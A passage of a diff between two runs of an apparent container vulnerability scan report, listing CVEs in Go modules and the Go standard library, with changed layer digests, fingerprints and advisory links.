 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:11c62c26ebb25b2f6f77193b7e33fd007d72270ae0c0665d27526ccfad03312a 
+│     │      ├ Fingerprint     : sha256:28f2ec9929be927e703a7e35dd132829fddac59f820059fe42ce7587fbbbcb93 
 │     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
 │     │      │                    HTML parsing bypass 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -2916,14 +2508,14 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.53.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:c80e5b02d71d9faa25b3cebbd39a933ecf415370c93ae5af951feac9c820d6f9 
+│     │      ├ Fingerprint     : sha256:dd100fbd9adb3aec2b6233f1afb3bbb60c1ec2282b85f673ac005048d19d8407 
 │     │      ├ Title           : net/http/internal/http2: golang: golang.org/x/net: Go HTTP/2: Denial of
 │     │      │                   Service via malformed SETTINGS_MAX_FRAME_SIZE frame 
 │     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
@@ -2987,13 +2579,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39821 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:d44aeecabe2798f853578c8bd0ee8fac6a24ad12d715afe16698f6939251117c 
+│     │      ├ Fingerprint     : sha256:53036a8542e3fc030c90525ba93cc610dbdc26c94f60dcc6781f3639274e1c71 
 │     │      ├ Title           : golang.org/x/net/idna: golang: net/http: golang.org/x/net/idna: Privilege
 │     │      │                   escalation via incorrect Punycode label processing 
 │     │      ├ Description     : The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels
@@ -3104,24 +2696,25 @@
 │     │      │                  ├ [85] : https://access.redhat.com/errata/RHSA-2026:47952 
 │     │      │                  ├ [86] : https://access.redhat.com/security/cve/CVE-2026-39821 
 │     │      │                  ├ [87] : https://bugzilla.redhat.com/2480756 
-│     │      │                  ├ [88] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
-│     │      │                  ├ [89] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
-│     │      │                  ├ [90] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
-│     │      │                  ├ [91] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
-│     │      │                  ├ [92] : https://errata.almalinux.org/9/ALSA-2026-37435.html 
-│     │      │                  ├ [93] : https://errata.rockylinux.org/RLSA-2026:37435 
-│     │      │                  ├ [94] : https://github.com/golang/go/issues/78760 
-│     │      │                  ├ [95] : https://go.dev/cl/767220 
-│     │      │                  ├ [96] : https://go.dev/issue/78760 
-│     │      │                  ├ [97] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
-│     │      │                  ├ [98] : https://linux.oracle.com/cve/CVE-2026-39821.html 
-│     │      │                  ├ [99] : https://linux.oracle.com/errata/ELSA-2026-46395.html 
-│     │      │                  ├ [100]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
-│     │      │                  ├ [101]: https://pkg.go.dev/vuln/GO-2026-5026 
-│     │      │                  ├ [102]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
+│     │      │                  ├ [88] : https://bugzilla.redhat.com/2484207 
+│     │      │                  ├ [89] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
+│     │      │                  ├ [90] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
+│     │      │                  ├ [91] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
+│     │      │                  ├ [92] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
+│     │      │                  ├ [93] : https://errata.almalinux.org/10/ALSA-2026-46395.html 
+│     │      │                  ├ [94] : https://errata.rockylinux.org/RLSA-2026:37435 
+│     │      │                  ├ [95] : https://github.com/golang/go/issues/78760 
+│     │      │                  ├ [96] : https://go.dev/cl/767220 
+│     │      │                  ├ [97] : https://go.dev/issue/78760 
+│     │      │                  ├ [98] : https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8 
+│     │      │                  ├ [99] : https://linux.oracle.com/cve/CVE-2026-39821.html 
+│     │      │                  ├ [100]: https://linux.oracle.com/errata/ELSA-2026-46395.html 
+│     │      │                  ├ [101]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
+│     │      │                  ├ [102]: https://pkg.go.dev/vuln/GO-2026-5026 
+│     │      │                  ├ [103]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-3982
 │     │      │                  │        1.json 
-│     │      │                  ├ [103]: https://ubuntu.com/security/notices/USN-8416-1 
-│     │      │                  ╰ [104]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
+│     │      │                  ├ [104]: https://ubuntu.com/security/notices/USN-8416-1 
+│     │      │                  ╰ [105]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
 │     │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
 │     │      ╰ LastModifiedDate: 2026-07-31T13:18:09.37Z 
 │     ├ [12] ╭ VulnerabilityID : CVE-2025-22872 
@@ -3133,13 +2726,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.38.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-22872 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:2285c04d8ac479dffbd9b2b89da3e05757311219624f53ca622b94f9f7a9b594 
+│     │      ├ Fingerprint     : sha256:4d9733a2b095804d98053127171e94d5e83916054da9de86536d59fb65809fde 
 │     │      ├ Title           : golang.org/x/net/html: Incorrect Neutralization of Input During Web Page
 │     │      │                   Generation in x/net in golang.org/x/net 
 │     │      ├ Description     : The tokenizer incorrectly interprets tags with unquoted attribute values that
@@ -3182,14 +2775,14 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.45.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-47911 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:e62bf324f11d9ea6d7726c4b5304278d291a489650b163bd055b9bdac356178e 
+│     │      ├ Fingerprint     : sha256:5f03d20ba9f6181d49da7cac3bdf4a7497030a1a23f908e6afe674ddf9766801 
 │     │      ├ Title           : golang.org/x/net/html: Quadratic parsing complexity in golang.org/x/net/html 
 │     │      ├ Description     : The html.Parse function in golang.org/x/net/html has quadratic parsing
 │     │      │                   complexity when processing certain inputs, which can lead to denial of service
@@ -3227,14 +2820,14 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.45.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-58190 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:7a822181b07929f4c8381de32b7eb096b24982d08573b46bfb8a75dd15dd9402 
+│     │      ├ Fingerprint     : sha256:eddc745f88b38446f131ed83b7c1ea0010434e6c6bc564dd25d868419ad0e7d5 
 │     │      ├ Title           : golang.org/x/net/html: Infinite parsing loop in golang.org/x/net 
 │     │      ├ Description     : The html.Parse function in golang.org/x/net/html has an infinite parsing loop
 │     │      │                   when processing certain inputs, which can lead to denial of service (DoS) if
@@ -3273,13 +2866,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25680 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:9bdaf4d9536d8f39eee8ad9b9c0a76e4d49139195403dcb67ad09d9ba814dd00 
+│     │      ├ Fingerprint     : sha256:d0d80ba767fe96d2735afb26b49bf65ca19a153979b5293c54775eb1953abb15 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Denial of Service due to
 │     │      │                   excessive HTML parsing 
 │     │      ├ Description     : Parsing arbitrary HTML can consume excessive CPU time, possibly leading to
@@ -3309,13 +2902,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42502 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:f6df53e57b58695d795344376291187c580440065e9ec382e8ca2ef3095cbdce 
+│     │      ├ Fingerprint     : sha256:e46df0e4490c3547a00c7faed204d1b55cc35c78dbbb8870bee9c6dea7c6f932 
 │     │      ├ Title           : golang.org/x/net/html: golang: golang.org/x/net/html: Cross-Site Scripting via
 │     │      │                    unexpected HTML tree rendering 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -3346,13 +2939,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.55.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42506 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:68015ac3bcc79274600c13ab6fee122d4bfb44f4bf50fff2591ad5bbfe076f32 
+│     │      ├ Fingerprint     : sha256:c3da70e94f6edf4c67ab4f06e67e23a9b57a0402ff52614f8f97ea1ea5c2c261 
 │     │      ├ Title           : golang.org/x/net/html: golang.org/x/net/html: Cross-Site Scripting (XSS) via
 │     │      │                   arbitrary HTML parsing 
 │     │      ├ Description     : Parsing arbitrary HTML which is then rendered using Render can result in an
@@ -3383,13 +2976,13 @@
 │     │      ├ InstalledVersion: v0.37.0 
 │     │      ├ FixedVersion    : 0.56.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:7524fec1617fc8b3cd3a7b9d1dcd9f0666b8b5f8536ea2fdeb4493aa8d3c6be5 
+│     │      ├ Fingerprint     : sha256:db9c452a13c850ab09ab6979da5813be3f4b50e50f2ff7d7236b10d8d3d80447 
 │     │      ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
 │     │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
 │     │      │                   value overflows the message buffer. 
@@ -3409,13 +3002,13 @@
 │     │      ├ InstalledVersion: v0.31.0 
 │     │      ├ FixedVersion    : 0.44.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39824 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:484e1417c4a02da225187187857b90e7b7efc9059dbde55f9a5afd39d49968b4 
+│     │      ├ Fingerprint     : sha256:2fa904d8019cefb7c53428dc694ee7ea889f6cd80fe74481fb1397a074fe3a0e 
 │     │      ├ Title           : Invoking integer overflow in NewNTUnicodeString in golang.org/x/sys/windows 
 │     │      ├ Description     : NewNTUnicodeString does not check for string length overflow. When provided
 │     │      │                   with a string that overflows the maximum size of a NTUnicodeString (a 16-bit
@@ -3437,13 +3030,13 @@
 │     │      ├ InstalledVersion: v0.23.0 
 │     │      ├ FixedVersion    : 0.39.0 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:a4b4bc569b3b70141cc87fbc2e127dd3f4b03e93728297d27c12353eadad9801 
+│     │      ├ Fingerprint     : sha256:f16cf4d6e0794919843ee685c65f80d9c6913e094d65ef083d76a6e965add332 
 │     │      ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
 │     │      ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
 │     │      │                   UTF-8 bytes. 
@@ -3465,13 +3058,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.8, 1.26.1 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-25679 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:a67920d57e58593d7a2db7f1debcf69718591bcc3ef6db9310fef5737b91a243 
+│     │      ├ Fingerprint     : sha256:539ed486b93b2185cb0e867673078ecfe8cbd02cd17e8e21e8d4248a9027a429 
 │     │      ├ Title           : net/url: Incorrect parsing of IPv6 host literals in net/url 
 │     │      ├ Description     : url.Parse insufficiently validated the host/authority component and accepted
 │     │      │                   some invalid URLs. 
@@ -3733,7 +3326,7 @@
 │     │      │                  ├ [240]: https://bugzilla.redhat.com/2445356 
 │     │      │                  ├ [241]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
 │     │      │                  ├ [242]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
-│     │      │                  ├ [243]: https://errata.almalinux.org/9/ALSA-2026-9044.html 
+│     │      │                  ├ [243]: https://errata.almalinux.org/10/ALSA-2026-8840.html 
 │     │      │                  ├ [244]: https://errata.rockylinux.org/RLSA-2026:9044 
 │     │      │                  ├ [245]: https://go.dev/cl/752180 
 │     │      │                  ├ [246]: https://go.dev/issue/77578 
@@ -3756,13 +3349,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.11, 1.26.4 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:da516aafd3f56fa35927cb88b7cebf7833b33d2b3658195bd4a1e2afb2f356e5 
+│     │      ├ Fingerprint     : sha256:456c7dd7d88984210b3cb3643b6fb6f4d739453f8690a002f68c028afa97b980 
 │     │      ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
 │     │      │                   processing of DNS SAN entries 
 │     │      ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
@@ -3823,13 +3416,13 @@
 │     │      │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47735 
 │     │      │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:47737 
 │     │      │                  ├ [38]: https://access.redhat.com/security/cve/CVE-2026-27145 
-│     │      │                  ├ [39]: https://bugzilla.redhat.com/2445356 
+│     │      │                  ├ [39]: https://bugzilla.redhat.com/2480756 
 │     │      │                  ├ [40]: https://bugzilla.redhat.com/2484207 
 │     │      │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
 │     │      │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
 │     │      │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
 │     │      │                  ├ [44]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
-│     │      │                  ├ [45]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
+│     │      │                  ├ [45]: https://errata.almalinux.org/10/ALSA-2026-46395.html 
 │     │      │                  ├ [46]: https://errata.rockylinux.org/RLSA-2026:36317 
 │     │      │                  ├ [47]: https://go.dev/cl/783621 
 │     │      │                  ├ [48]: https://go.dev/issue/79694 
@@ -3852,13 +3445,13 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.9, 1.26.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32280 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:cc564f0789e7fd19407732df2818d83b024cbe7c868fbac86e48ac433017ba96 
+│     │      ├ Fingerprint     : sha256:ba20fd3656c25d215eb75d916e0dd6e2e5e304bc397f616ebfaf7a0ef7ed41d7 
 │     │      ├ Title           : crypto/x509: crypto/tls: golang: Go: Denial of Service vulnerability in
 │     │      │                   certificate chain building 
 │     │      ├ Description     : During chain building, the amount of work that is done is not correctly
@@ -4042,7 +3635,7 @@
 │     │      │                  ├ [160]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
 │     │      │                  ├ [161]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
 │     │      │                  ├ [162]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
-│     │      │                  ├ [163]: https://errata.almalinux.org/9/ALSA-2026-29703.html 
+│     │      │                  ├ [163]: https://errata.almalinux.org/10/ALSA-2026-29195.html 
 │     │      │                  ├ [164]: https://errata.rockylinux.org/RLSA-2026:29703 
 │     │      │                  ├ [165]: https://go.dev/cl/758320 
 │     │      │                  ├ [166]: https://go.dev/issue/78282 
@@ -4065,14 +3658,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.9, 1.26.2 
 │     │      ├ Status          : fixed 
-│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+│     │      ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+│     │      │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
 │     │      ├ SeveritySource  : nvd 
 │     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32281 
 │     │      ├ DataSource       ╭ ID  : govulndb 
 │     │      │                  ├ Name: The Go Vulnerability Database 
 │     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
-│     │      ├ Fingerprint     : sha256:aba131436ee0c769c0d492590ad2c32f3ef6b98eb3c2b724665766d53f6de480 
+│     │      ├ Fingerprint     : sha256:a391c4a76248348a7ce88ac0de62230d4358ee9034a30b85891c175d0328b65c 
 │     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Denial of Service via inefficient
 │     │      │                   certificate chain validation 
 │     │      ├ Description     : Validating certificate chains which use policies is unexpectedly inefficient
@@ -4096,7 +3689,7 @@
 │     │      │                  │         ╰ V3Score : 7.5 
 │     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H 
 │     │      │                            ╰ V3Score : 5.9 
-│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29703 
+│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29195 
 │     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32281 
 │     │      │                  ├ [2] : https://bugzilla.redhat.com/2445356 
 │     │      │                  ├ [3] : https://bugzilla.redhat.com/2456333 
@@ -4110,7 +3703,7 @@
 │     │      │                  ├ [11]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
 │     │      │                  ├ [12]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32281 
 │     │      │                  ├ [13]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
-│     │      │                  ├ [14]: https://errata.almalinux.org/9/ALSA-2026-29703.html 
+│     │      │                  ├ [14]: https://errata.almalinux.org/10/ALSA-2026-29195.html 
 │     │      │                  ├ [15]: https://errata.rockylinux.org/RLSA-2026:29703 
 │     │      │                  ├ [16]: https://go.dev/cl/758061 
 │     │      │                  ├ [17]: https://go.dev/issue/78281 
@@ -4131,14 +3724,14 @@
 │     │      ├ InstalledVersion: v1.24.13 
 │     │      ├ FixedVersion    : 1.25.9, 1.26.2 
